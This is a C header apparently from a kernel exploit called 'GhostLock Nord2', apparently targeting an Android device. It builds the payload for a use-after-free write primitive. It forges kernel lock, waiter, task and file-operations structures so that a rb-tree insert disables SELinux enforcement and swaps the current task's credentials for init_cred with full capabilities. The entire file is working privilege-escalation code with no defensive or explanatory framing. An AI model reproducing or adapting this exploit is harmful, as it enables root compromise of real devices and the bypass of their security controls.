/*
 * GhostLock Nord2 - SKB payload builder
 * Constructs the fake kernel page payload for the UAF write primitive.
 */
#pragma once
#include <stdint.h>
#include <string.h>
#include "nord2_offsets.h"

static inline void put64(uint8_t *p, size_t off, uint64_t v) {
    memcpy(p + off, &v, 8);
}
static inline void put32(uint8_t *p, size_t off, uint32_t v) {
    memcpy(p + off, &v, 4);
}

/*
 * Build the fake fops table at p+off.
 * All pointer fields reference real kernel functions (CFI-compatible).
 */
static void build_fake_fops(uint8_t *p, size_t off, uint64_t stext) {
    put64(p, off + FOPS_OWNER_OFF,        0);
    put64(p, off + FOPS_LLSEEK_OFF,       stext + NOOP_LLSEEK_OFF);
    put64(p, off + FOPS_READ_OFF,         0);
    put64(p, off + FOPS_WRITE_OFF,        0);
    put64(p, off + FOPS_READ_ITER_OFF,    stext + CONFIGFS_READ_ITER_OFF);
    put64(p, off + FOPS_WRITE_ITER_OFF,   stext + CONFIGFS_BIN_WRITE_ITER_OFF);
    put64(p, off + FOPS_IOCTL_OFF,        stext + ASHMEM_IOCTL_OFF);
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, stext + ASHMEM_COMPAT_IOCTL_OFF);
    put64(p, off + FOPS_MMAP_OFF,         stext + ASHMEM_MMAP_OFF);
    put64(p, off + FOPS_OPEN_OFF,         stext + ASHMEM_OPEN_OFF);
    put64(p, off + FOPS_RELEASE_OFF,      stext + ASHMEM_RELEASE_OFF);
    put64(p, off + FOPS_SPLICE_READ_OFF,  stext + COPY_SPLICE_READ_OFF);
    put64(p, off + FOPS_SHOW_FDINFO_OFF,  stext + ASHMEM_RELEASE_OFF);
}

/*
 * Build a copy of init_cred layout at p+off for Write 2.
 * When the rbtree insert lands here as __rb_parent_color,
 * the pointer written will be init_cred VA. uid/caps at offset 8+ stay valid.
 */
static void build_cred_copy(uint8_t *p, size_t off, uint64_t init_cred) {
    /* init_cred copy: usage=2 (won't be freed), uid/gid/caps = 0 */
    put32(p, off + CRED_USAGE_OFF, 2);
    /* uid, gid, suid, sgid, euid, egid, fsuid, fsgid = all 0 */
    memset(p + off + CRED_UID_OFF, 0, 32);
    /* securebits = 0 */
    put32(p, off + CRED_SECUREBITS_OFF, 0);
    /* capabilities: all CAP_FULL */
    for (int i = 0; i < CRED_CAP_WORDS; i++)
        put64(p, off + CRED_CAPS_OFF + i*8, CAP_FULL);
    /* security: point to init_cred's security blob (stay at init_cred+0x80) */
    put64(p, off + CRED_SECURITY_OFF, init_cred + CRED_SECURITY_OFF);
}

/*
 * Prepare a single ORDER3 chunk of the SKB payload.
 *
 * mode 1 = Write 1: disable SELinux (write 0 to selinux_enforcing)
 * mode 2 = Write 2: overwrite task->cred with init_cred
 *
 * target  = kernel VA to write to (task_cred_ptr or selinux_enforcing)
 * value   = value to write (0 for selinux_enforcing, init_cred for cred ptr)
 * child_node = 1 if this is the rb-tree child (right) node
 */
static void build_skb_chunk(uint8_t *p, size_t base_off, uint64_t page_base,
                              uint64_t stext, uint64_t init_cred,
                              uint64_t init_task, uint64_t root_task_group,
                              int mode, uint64_t target, int child_node) {
    uint8_t *b = p + base_off;

    uint64_t payload_base = page_base + (uint64_t)SKB_DATA_DELTA + base_off;

    uint64_t fake_lock  = payload_base + LOCK_OFF;
    uint64_t fake_w0    = payload_base + W0_OFF;
    uint64_t fake_task  = payload_base + FAKE_TASK_OFF;
    uint64_t fake_fops  = payload_base + FOPS_TABLE_OFF;

    /* Determine rb-tree write targets */
    uint64_t fake_parent, fake_right, fake_left;
    if (mode == 1) {
        /* Write 1: selinux_enforcing = 0
         * fake_right = page+0x100 (byte0=0, byte1=1 → enforcing=0, initialized=1) */
        fake_parent = target - 8;
        fake_right  = child_node ? (page_base + 0x100) : 0;
        fake_left   = 0;
    } else {
        /* Write 2: task->cred = init_cred
         * fake_right = init_cred VA (real P0 address) */
        fake_parent = target - 8;
        fake_right  = child_node ? init_cred : 0;
        fake_left   = 0;
        fake_fops   = payload_base + CRED_COPY_OFF;
    }

    /* rt_mutex (fake_lock) */
    put32(b, LOCK_OFF + 0x00, 0);           /* wait_lock.raw_lock */
    put64(b, LOCK_OFF + 0x08, fake_w0);    /* waiters.rb_root */
    put64(b, LOCK_OFF + 0x10, fake_w0);    /* waiters.rb_leftmost */
    put64(b, LOCK_OFF + 0x18, fake_task | 1); /* owner (tagged) */

    /* fake rt_mutex_waiter (W0) */
    put64(b, W0_OFF + 0x00, 1);            /* rb_node.__rb_parent_color */
    put64(b, W0_OFF + 0x08, 0);
    put64(b, W0_OFF + 0x10, 0);
    put32(b, W0_OFF + WAITER_PRIO_OFF,     FAKE_WAITER_PRIO);
    put64(b, W0_OFF + WAITER_DEADLINE_OFF, 0);
    /* pi_tree rb_node: parent=fake_parent, right=fake_right, left=fake_left */
    put64(b, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, fake_parent);
    put64(b, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, fake_right);
    put64(b, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, fake_left);
    put32(b, W0_OFF + WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(b, W0_OFF + WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(b, W0_OFF + WAITER_TASK_OFF,    init_task);
    put64(b, W0_OFF + WAITER_LOCK_OFF,    fake_lock);
    put32(b, W0_OFF + WAITER_WAKE_STATE_OFF, 0);

    /* fake task_struct */
    put32(b, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF,        0x100);
    put32(b, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF,         FAKE_TASK_PRIO);
    put32(b, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF,  FAKE_TASK_PRIO);
    put32(b, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF,      0);
    put64(b, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,   0);
    put64(b, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF+8, 0);
    put64(b, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF,   root_task_group);
    put64(b, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,  init_task);
    put64(b, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    /* rb right/left helper nodes */
    put64(b, RIGHT_OFF + 0x00, fake_parent);
    put64(b, RIGHT_OFF + 0x08, 0);
    put64(b, RIGHT_OFF + 0x10, 0);
    put64(b, LEFT_OFF  + 0x00, fake_parent);
    put64(b, LEFT_OFF  + 0x08, 0);
    put64(b, LEFT_OFF  + 0x10, 0);

    /* fake fops */
    build_fake_fops(b, FOPS_TABLE_OFF, stext);

    /* Write-2 cred copy */
    if (mode == 2)
        build_cred_copy(b, CRED_COPY_OFF, init_cred);

    /* byte at +0x100 = 0 (selinux_enforcing = 0 for Write 1) */
    b[0x100] = 0;
    b[0x101] = 1;
}

/*
 * Fill the entire SKB buffer with payload chunks.
 */
static void build_skb_payload(uint8_t *skb, uint64_t page_base,
                               uint64_t stext, uint64_t init_cred,
                               uint64_t init_task, uint64_t root_task_group,
                               int mode, uint64_t target, int child_node) {
    memset(skb, 0x41, SKB_SEND_SIZE);
    for (size_t off = 0; off < SKB_SEND_SIZE; off += ORDER3_SIZE) {
        build_skb_chunk(skb, off + SKB_FRAG_BIAS, page_base,
                        stext, init_cred, init_task, root_task_group,
                        mode, target, child_node);
    }
}
